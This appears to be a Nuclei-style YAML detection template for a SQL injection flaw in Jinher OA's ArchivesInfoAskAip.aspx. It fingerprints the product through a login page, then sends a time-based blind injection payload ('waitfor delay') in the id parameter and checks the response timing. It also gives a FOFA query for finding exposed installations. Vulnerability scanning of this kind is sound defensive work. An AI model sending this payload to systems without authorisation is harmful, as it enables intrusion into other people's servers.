id: poc-yaml-jinher-archivesinfoaskaip-aspx-sqli
info:
  name: 金和OA ArchivesInfoAskAip.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 金和OA
    fofa: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(2,6)}}"
  t2: "{{to_number(t1) + to_number(t1)}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/ArchivesInfoAskAip.aspx/?id=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "请示信息"
          - "打印反馈意见"
        condition: and
        part: body
      - type: word
        words:
          - "插入办理意见"
        part: body
        negative: true
      - type: dsl
        dsl:
          - "duration >= to_number(t2) && duration <= to_number(t3)"
